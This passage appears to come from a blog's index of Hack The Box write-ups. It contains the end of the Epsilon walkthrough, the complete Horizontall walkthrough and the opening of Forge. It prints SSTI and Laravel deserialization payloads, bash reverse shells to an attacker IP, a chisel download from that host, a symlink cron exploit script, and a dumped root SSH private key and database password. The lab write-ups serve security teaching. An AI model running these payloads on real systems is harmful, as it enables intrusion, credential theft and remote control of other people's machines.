10.10.11.134:5000/order -sd 'costume={{7*7}}\u0026q=1337\u0026addr=asdf' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg' | grep 49 Your order of \"49\" has been placed successfully.  Since {{7*7}} is replaced by 49, the injection works. Now we can check PayloadsAllTheThings to take a Remote Code Execution (RCE) payload like this one:\n{{ cycler.__init__.__globals__.os.popen('id').read() }}  But instead of using id as a command, we will execute a reverse shell encoding the command in Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Now we send the payload while we listen with nc:\n$ curl 10.10.11.134:5000/order -sd 'costume={{cycler.__init__.__globals__.os.popen(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\").read()}}\u0026q=1337\u0026addr=asdf' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.134. Ncat: Connection from 10.10.11.134:32940. bash: cannot set terminal process group (996): Inappropriate ioctl for device bash: no job control in this shell tom@epsilon:/var/www/app$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null tom@epsilon:/var/www/app$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm tom@epsilon:/var/www/app$ export TERM=xterm tom@epsilon:/var/www/app$ export SHELL=bash tom@epsilon:/var/www/app$ stty rows 50 columns 158 tom@epsilon:/var/www/app$ cd tom@epsilon:~$ cat user.txt f331291fab610895dd18aefba73ffb2c  System enumeration Basic enumeration tells us that there weird directory at /opt:\ntom@epsilon:~$ ls -la --time-style=+ /opt total 16 drwxr-xr-x 4 root root 4096 . drwxr-xr-x 19 root root 4096 .. drwxr-xrwx 2 root root 4096 backups drwx--x--x 4 root root 4096 containerd  We are able to write and read from this backups directory. Usually, backups are made periodically, so maybe we can find a script that is being run as a Cron job:\ntom@epsilon:~$ find / -type f -name \\*backup\\* 2\u0026gt;/dev/null | grep -v python /usr/share/man/man8/vgcfgbackup.8.gz /usr/src/linux-headers-5.4.0-97-generic/include/config/wm831x/backup.h /usr/src/linux-headers-5.4.0-97-generic/include/config/net/team/mode/activebackup.h /usr/src/linux-headers-5.4.0-97/tools/testing/selftests/net/tcp_fastopen_backup_key.sh /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so /usr/lib/modules/5.4.0-97-generic/kernel/drivers/power/supply/wm831x_backup.ko /usr/lib/modules/5.4.0-97-generic/kernel/drivers/net/team/team_mode_activebackup.ko /usr/bin/backup.sh /sys/devices/virtual/net/veth3701941/brport/backup_port  There is a Bash script at /usr/bin/backup.sh that performs a periodic backup of /var/www/app:\n#!/bin/bash file=`date +%N` /usr/bin/rm -rf /opt/backups/* /usr/bin/tar -cvf \"/opt/backups/$file.tar\" /var/www/app/ sha1sum \"/opt/backups/$file.tar\" | cut -d ' ' -f1 \u0026gt; /opt/backups/checksum sleep 5 check_file=`date +%N` /usr/bin/tar -chvf \"/var/backups/web_backups/${check_file}.tar\" /opt/backups/checksum \"/opt/backups/$file.tar\" /usr/bin/rm -rf /opt/backups/*  The vulnerability here is the use of -h for tar because it will follow symlinks and compress their contents. Using explainsh, we can see what each flag of the command does:\n$ explainsh 'tar -chvf \"/var/backups/web_backups/${check_file}.tar\" /opt/backups/checksum \"/opt/backups/$file.tar\"' The GNU version of the tar archiving utility -c, --create create a new archive -h, --dereference follow symlinks; archive and dump the files they point to -v, --verbose verbosely list files processed -f, --file ARCHIVE use archive file or device ARCHIVE tar [-] A --catenate --concatenate | c --create | d --diff --compare | --delete | r --append | t --list | --test-label | u --update | x --extract --get [options] [pathname ...] http://manpages.ubuntu.com/manpages/precise/en/man1/tar.html  Privilege escalation In order to exploit the Cron job, we will use /opt/backups/checksum to store a symlink to /root/.ssh. This must be configured after the first execution of tar (we will have 5 seconds). The second one uses -h, so the contents of /opt/backups/checksum -\u0026gt; /root/.ssh will be compressed and stored at /var/backups/web_backups/.\nAlthough it can be done manually, I decided to use a custom Bash script:\ntom@epsilon:~$ cd /tmp tom@epsilon:/tmp$ vim privesc.sh  #!/usr/bin/env bash while true; do if [ ! -z \"$(ls /opt/backups)\" ]; then echo '[*] First `tar` executed' break fi done rm -f /opt/backups/checksum ln -sf /root/.ssh /opt/backups/checksum echo '[+] Symlink created' sleep 6 file=$(ls -la /var/backups/web_backups | tail -1 | awk '{ print $9 }') echo \"[+] Found file: $file\" cp /var/backups/web_backups/$file /tmp cd /tmp tar -xvf $file echo '[!] Symlink content' ls opt/backups/checksum echo '[!] `root` SSH key' cat opt/backups/checksum/id_rsa  Basically, it waits until a new backup is stored in /opt/backups, then it creates the symlink and waits until the second backup is stored in /var/backups/web_backups. After that, we take the compressed file and extract its contents in order to read /root/.ssh/id_rsa:\ntom@epsilon:/tmp$ bash privesc.sh [*] First `tar` executed [+] Symlink created [+] Found file: 376776221.tar opt/backups/checksum/ opt/backups/checksum/id_rsa opt/backups/checksum/id_rsa.pub opt/backups/checksum/authorized_keys opt/backups/366066624.tar [!] Symlink content authorized_keys id_rsa id_rsa.pub [!] `root` SSH key -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----  Using this SSH private key, we can access to the machine as root:\n$ ssh -i id_rsa root@10.10.11.134 root@epsilon:~# cat root.txt cf3d789a49b8c920c09142c741e00c34  ","image":"/images/HTB/Epsilon/Epsilon.png","permalink":"https://7rocky.github.io/en/htb/epsilon/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine contains a website that exposes Git repository with secrets in old commits. There is a website that needs a valid JWT token in order to exploit an SSTI vulnerability. The secret for the JWT tokens is stored in an AWS Lambda function. Then, there is a Cron job that can be exploited using symlinks to gain arbitrary read. Knowledge about Git, JWT, SSTI and AWS Lambda, as well as Cron job exploitation, is needed to compromise this machine","time":10,"title":"Epsilon"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.105   Release: 28 / 08 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.105 -p 22,80 Nmap scan report for horizontall.htb (10.10.11.105) Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: horizontall |_http-server-header: nginx/1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.27 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration The website is redirecting to http://horizontall.htb, so let\u0026rsquo;s put the domain in /etc/hosts. Then we can see a web application built with Vue.js (a JavaScript front-end framework):\nHowever, the only interesting thing is a JavaScript file containing a URL for http://api-prod.horizontall.htb (we are able to find it searching for \u0026quot;horizontall.htb\u0026quot;):\nSo let\u0026rsquo;s add this subdomain again to /etc/hosts. In this subdomain we see a simple web application like the next one:\nRunning gobuster we enumerate some routes:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -r -u http://api-prod.horizontall.htb /reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854]  API enumeration The first two routes return a JSON output:\n$ curl -s api-prod.horizontall.htb/users | jq { \"statusCode\": 403, \"error\": \"Forbidden\", \"message\": \"Forbidden\" }  $ curl -s api-prod.horizontall.htb/reviews | jq [ { \"id\": 1, \"name\": \"wail\", \"description\": \"This is good service\", \"stars\": 4, \"created_at\": \"2021-05-29T13:23:38.000Z\", \"updated_at\": \"2021-05-29T13:23:38.000Z\" }, { \"id\": 2, \"name\": \"doe\", \"description\": \"i'm satisfied with the product\", \"stars\": 5, \"created_at\": \"2021-05-29T13:24:17.000Z\", \"updated_at\": \"2021-05-29T13:24:17.000Z\" }, { \"id\": 3, \"name\": \"john\", \"description\": \"create service with minimum price i hop i can buy more in the futur\", \"stars\": 5, \"created_at\": \"2021-05-29T13:25:26.000Z\", \"updated_at\": \"2021-05-29T13:25:26.000Z\" } ]  And the /admin endpoint redirects to /admin/auth/login and shows a login form made with Strapi. However, we cannot do anything here yet. Default credentials do not work.\nWe can check all the requests done when accessing /admin from the browser developer tools. There is one pointing to /admin/init that responds with some information, including the Strapi version:\n$ curl -s api-prod.horizontall.htb/admin/init | jq { \"data\": { \"uuid\": \"a55da3bd-9693-4a08-9279-f9df57fd1817\", \"currentEnvironment\": \"development\", \"autoReload\": false, \"strapiVersion\": \"3.0.0-beta.17.4\" } }  With this information, we can look for exploits and vulnerabilities for this Strapi version. There are two that apply to the situation. The first one allows to reset the admin password without authentication (CVE-2019-18818), and the other one triggers Remote Code Execution (RCE), but needs authentication as administrator (CVE-2019-19609).\nFoothold This blog explains the reset password vulnerability. There is a Python script that automates it. This exploit returns the JSON Web Token (JWT) that we need to be authenticated. And thus the JWT is needed for the second exploit, which can be found here.\nExploiting Strapi To gain RCE in Strapi, I have joined the two exploits into a Python script called rce_strapi.py (detailed explanation here).\nWe also need the email for admin, but we can guess that it is admin@horizontall.htb.\nIf we execute the script, the password will be reset to the provided one (asdfasdfasdf). And then we get access to the machine using nc:\n$ python3 rce_strapi.py 10.10.17.44 4444 [*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4 [*] Sending password reset request... [*] Setting new password... [*] Response: {\"jwt\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMTg5ODcyLCJleHAiOjE2MzI3ODE4NzJ9.4_HRMhnzA9CEcw6-p2uCOKJWTxpRkCiMaWiNfGDWKRc\",\"user\":{\"id\":3,\"username\":\"admin\",\"email\":\"admin@horizontall.htb\",\"blocked\":null}}  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.105. Ncat: Connection from 10.10.11.105:40764. /bin/sh: 0: can't access tty; job control turned off $ script /dev/null -c bash Script started, file is /dev/null strapi@horizontall:~/myapi$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm strapi@horizontall:~/myapi$ export TERM=xterm strapi@horizontall:~/myapi$ export SHELL=bash strapi@horizontall:~/myapi$ stty rows 50 columns 158  System enumeration Now from the machine, we see that there is a user called developer. However, we are able list its personal directory and capture the user.txt flag:\nstrapi@horizontall:~/myapi$ ls /home developer strapi@horizontall:~/myapi$ ls -la /home/developer/ total 108 drwxr-xr-x 8 developer developer 4096 Aug 2 12:07 . drwxr-xr-x 3 root root 4096 May 25 11:43 .. lrwxrwxrwx 1 root root 9 Aug 2 12:05 .bash_history - /dev/null -rw-r----- 1 developer developer 242 Jun 1 12:53 .bash_logout -rw-r----- 1 developer developer 3810 Jun 1 12:47 .bashrc drwx------ 3 developer developer 4096 May 26 12:00 .cache -rw-rw---- 1 developer developer 58460 May 26 11:59 composer-setup.php drwx------ 5 developer developer 4096 Jun 1 11:54 .config drwx------ 3 developer developer 4096 May 25 11:45 .gnupg drwxrwx--- 3 developer developer 4096 May 25 19:44 .local drwx------ 12 developer developer 4096 May 26 12:21 myproject -rw-r----- 1 developer developer 807 Apr 4 2018 .profile drwxrwx--- 2 developer developer 4096 Jun 4 11:21 .ssh -r--r--r-- 1 developer developer 33 Aug 28 21:38 user.txt lrwxrwxrwx 1 root root 9 Aug 2 12:07 .viminfo - /dev/null strapi@horizontall:~/myapi$ cat /home/developer/user.txt 8737d52fd79f838b0e4dc682bc8a28d9  There is an interesting file called composer-setup.php and a folder called myproject, but we are not able to read them.\nWe can check for credentials in the source code for the Strapi webapp. Indeed, we can find MySQL credentials as follows:\nstrapi@horizontall:~/myapi$ ls -la total 648 drwxr-xr-x 9 strapi strapi 4096 Jul 29 2021 . drwxr-xr-x 10 strapi strapi 4096 Feb 3 15:07 .. drwxr-xr-x 3 strapi strapi 4096 May 29 2021 api drwxrwxr-x 2 strapi strapi 12288 May 26 2021 build drwxrwxr-x 5 strapi strapi 4096 May 26 2021 .cache drwxr-xr-x 5 strapi strapi 4096 Jul 29 2021 config -rw-r--r-- 1 strapi strapi 249 May 26 2021 .editorconfig -rw-r--r-- 1 strapi strapi 32 May 26 2021 .eslintignore -rw-r--r-- 1 strapi strapi 541 May 26 2021 .eslintrc drwxr-xr-x 3 strapi strapi 4096 May 26 2021 extensions -rw-r--r-- 1 strapi strapi 1150 May 26 2021 favicon.ico -rw-r--r-- 1 strapi strapi 1119 May 26 2021 .gitignore drwxrwxr-x 1099 strapi strapi 36864 Aug 3 2021 node_modules -rw-rw-r-- 1 strapi strapi 1009 May 26 2021 package.json -rw-rw-r-- 1 strapi strapi 552845 May 26 2021 package-lock.json drwxr-xr-x 3 strapi strapi 4096 Jun 2 2021 public -rw-r--r-- 1 strapi strapi 69 May 26 2021 README.md strapi@horizontall:~/myapi$ ls -la config/ total 40 drwxr-xr-x 5 strapi strapi 4096 Jul 29 04:24 . drwxr-xr-x 9 strapi strapi 4096 Jul 29 04:29 .. -rw-r--r-- 1 strapi strapi 136 May 26 14:31 application.json -rw-r--r-- 1 strapi strapi 110 May 26 14:31 custom.json drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 environments drwxr-xr-x 3 strapi strapi 4096 May 26 14:31 functions -rw-r--r-- 1 strapi strapi 188 May 26 14:31 hook.json -rw-r--r-- 1 strapi strapi 173 May 26 14:31 language.json drwxr-xr-x 2 strapi strapi 4096 May 26 14:31 locales -rw-r--r-- 1 strapi strapi 317 May 26 14:31 middleware.json strapi@horizontall:~/myapi$ ls -la config/environments/ total 20 drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 . drwxr-xr-x 5 strapi strapi 4096 Jul 29 04:24 .. drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:38 development drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:24 production drwxr-xr-x 2 strapi strapi 4096 May 26 14:31 staging strapi@horizontall:~/myapi$ ls -la config/environments/development/ total 32 drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:38 . drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 .. -rw-r--r-- 1 strapi strapi 135 May 26 14:31 custom.json -rw-rw-r-- 1 strapi strapi 351 May 26 14:31 database.json -rw-r--r-- 1 strapi strapi 439 May 26 14:31 request.json -rw-r--r-- 1 strapi strapi 164 May 26 14:31 response.json -rw-r--r-- 1 strapi strapi 529 May 26 14:31 security.json -rw-r--r-- 1 strapi strapi 159 May 26 14:31 server.json strapi@horizontall:~/myapi$ cat config/environments/development/database.json { \"defaultConnection\": \"default\", \"connections\": { \"default\": { \"connector\": \"strapi-hook-bookshelf\", \"settings\": { \"client\": \"mysql\", \"database\": \"strapi\", \"host\": \"127.0.0.1\", \"port\": 3306, \"username\": \"developer\", \"password\": \"#J!:F9Zt2u\" }, \"options\": {} } } }  Unfortunately, there is nothing to do here, since the admin password was reset with the previous exploit and there are no more databases but strapi:\nWelcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 12 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | strapi | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql quit Bye  Here is where we need to recall the PHP file and the project we saw in /home/developer. Let\u0026rsquo;s do a port scanning from inside the machine using a simple Bash script:\nstrapi@horizontall:~/myapi$ cd /tmp strapi@horizontall:/tmp$ echo -e '#!/bin/bash\\n\\nfor i in $(seq 1 65535); do\\n timeout 1 echo 2\u0026gt;/dev/null  /dev/tcp/127.0.0.1/$i \u0026\u0026 echo \"Port $i: open\" \u0026\\ndone; wait'  .scan.sh strapi@horizontall:/tmp$ chmod +x .scan.sh strapi@horizontall:/tmp$ cat .scan.sh  #!/bin/bash for i in $(seq 1 65535); do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/127.0.0.1/$i \u0026amp;\u0026amp; echo \"Port $i: open\" \u0026amp; done; wait  strapi@horizontall:/tmp$ ./.scan.sh Port 22: open Port 80: open Port 1337: open Port 3306: open Port 8000: open Port 57900: open  A simpler way to enumerate open ports is with netstat:\nstrapi@horizontall:/tmp$ netstat -nat | grep LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN  And there are more ports that were not exposed (and thus not reported by nmap).\nPort 1337 contains the website for http://api-prod.horizontall.htb, because it is configured in the nginx server:\nstrapi@horizontall:/tmp$ cat /etc/nginx/sites-enabled/horizontall.htb server { # server block for 'horizontall.htb' domain listen 80; listen [::]:80; server_name horizontall.htb www.horizontall.htb; root /var/www/html/horizontall; index index.html index.htm; location / { try_files $uri $uri/ =404; } } server { listen [::]:80; listen 80; server_name api-prod.horizontall.htb; location / { proxy_pass http://localhost:1337; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade'; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } server { # server block for all the other requests # this block will be a default server block listening on port 80 listen 80 default_server; listen [::]:80 default_server; # close the connection immediately return 301 http://horizontall.htb; }  Privilege escalation We can check that http://localhost:8000 contains a website built with Laravel (a PHP web framework):\nstrapi@horizontall:/tmp$ curl -I 127.0.0.1:8000 HTTP/1.1 200 OK Host: 127.0.0.1:8000 Date: Connection: close X-Powered-By: PHP/7.4.22 Content-Type: text/html; charset=UTF-8 Cache-Control: no-cache, private Set-Cookie: XSRF-TOKEN=eyJpdiI6IkRsV2pwUEV3Q20zVlFQZzh4Y2JlblE9PSIsInZhbHVlIjoibkdhcjM0U2pNTWErUXQzUkdUSDZWL2FiZnIvS2J2cjFEWGlYRjBvZEdDZElZZGt4OGJOUnhVdWJXdndiL2ZnSXNiZWI3ejl2dXczVVdXT1JKQ0h6TDllUy95RzBhRE1qSDRaYmZmWlBkTGNVbHhXUDIwT2xHM1pyN0huQ3BrNlUiLCJtYWMiOiI1NjYxZGM2NWFiZGNhMWNmZmIwMGQwMzZhZjYzZTkyYTgzNGY2ZWJkYTdlYmQ4OGVjZTBlYmNmYjY3ZGM3MGNkIn0%3D; Max-Age=7200; path=/; samesite=lax Set-Cookie: laravel_session=eyJpdiI6IlkyV3AxWUZ3U3ozL0RnTkNwalQ2SWc9PSIsInZhbHVlIjoialFWbE00dzNCa01yeXUxaEU4c08ydU05M1F4WHUzbFp3eUNDLzNFVWNXcGd0YVM4SW9FTHdkVW4xR2Z0V3lxeWx1d2taMFMvdFV5SThDVWNTcFdkT3dXZVBBcnVMS2FuVmlXdTI3aFFVNWF6b0hVYzJYdThZSmJiZmJXQ1ZxNXkiLCJtYWMiOiI3MTI0NTk1ZDE5NzE4N2YwYzAwM2MwOWJlY2NiMDFkMmU5YTY2ZTliNWU1MTk4OTAxNmM0YWQ4M2M0YjA5YWRmIn0%3D; Max-Age=7200; path=/; httponly; samesite=lax  Port forwarding At this point, it is helpful to run chisel to perform a port forwarding of port 8000 to the attacker machine:\n$ ./chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:8000=8000: Listening  strapi@horizontall:/tmp$ curl 10.10.17.44/chisel -o .chisel % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2315k 100 2315k 0 0 402k 0 0:00:05 0:00:05 --:--:-- 409k strapi@horizontall:/tmp$ chmod +x .chisel strapi@horizontall:/tmp$ ./.chisel client 10.10.17.44:1337 R:8000:127.0.0.1:8000 client: Connecting to ws://10.10.17.44:1337 client: Connected (Latency 109.928393ms)  Exploiting Laravel Now, we can access the Laravel website from the attacker machine via http://127.0.0.1:8000:\nThe website shows that it is using Laravel v8 (PHP v7.4.18). Again, we can find an exploit for this version. The one from ExploitDB did not work properly, but there is another one explained here (CVE-2021-3129), which has a link to the exploit.\nFirst, we need to clone another repository (apart from the exploit) to have phpggc. Then we can follow the steps shown in the exploit and gain Remote Code Execution (RCE).\nAs a proof of concept, let\u0026rsquo;s try to execute the command id:\n$ git clone https://github.com/ambionics/phpggc $ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system id $ python3 laravel-ignition-rce.py http://localhost:8000 ./exploit.phar + Log file: /home/developer/myproject/storage/logs/laravel.log + Logs cleared + Successfully converted to PHAR ! + Phar deserialized -------------------------- uid=0(root) gid=0(root) groups=0(root) -------------------------- + Logs cleared  And we see that we are root.\nSo, let\u0026rsquo;s execute the exploit again to obtain a reverse shell on the machine:\n$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system \"bash -c 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261'\" $ python3 laravel-ignition-rce.py http://localhost:8000 ./exploit.phar + Log file: /home/developer/myproject/storage/logs/laravel.log + Logs cleared + Successfully converted to PHAR !  And finally, we have root access to the machine and we can read the root.txt flag:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.105. Ncat: Connection from 10.10.11.105:49338. bash: cannot set terminal process group (17432): Inappropriate ioctl for device bash: no job control in this shell root@horizontall:/home/developer/myproject/public# cat /root/root.txt 0d37c358b4147cb69b83ef1aa753655f  ","image":"/images/HTB/Horizontall/Horizontall.png","permalink":"https://7rocky.github.io/en/htb/horizontall/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a website that hides a valid subdomain that contains a Strapi webapp vulnerable to RCE. There is also an internal Laravel webapp vulnerable to RCE. Some knowledge about JavaScript, PHP and Python, as well as port forwarding techniques, are needed to compromise this machine. This write-up uses a custom script that chains two exploits for Strapi needed to obtain RCE","time":10,"title":"Horizontall"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.111   Release: 11 / 09 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.111 -p21,22,80 Nmap scan report for forge.htb (10.10.11.111) Host is up (0.075s latency). PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Gallery Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.24 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open. Port 21 (FTP) is filtered.\nWeb enumeration If we go to http://10.10.11.111, the machine contains a website that redirects to http://forge.htb. After putting the hostname in /etc/hosts we will see this website:\nIt allows us to upload images to the server. We can upload a local file or use an URL:\nWe put an URL to our 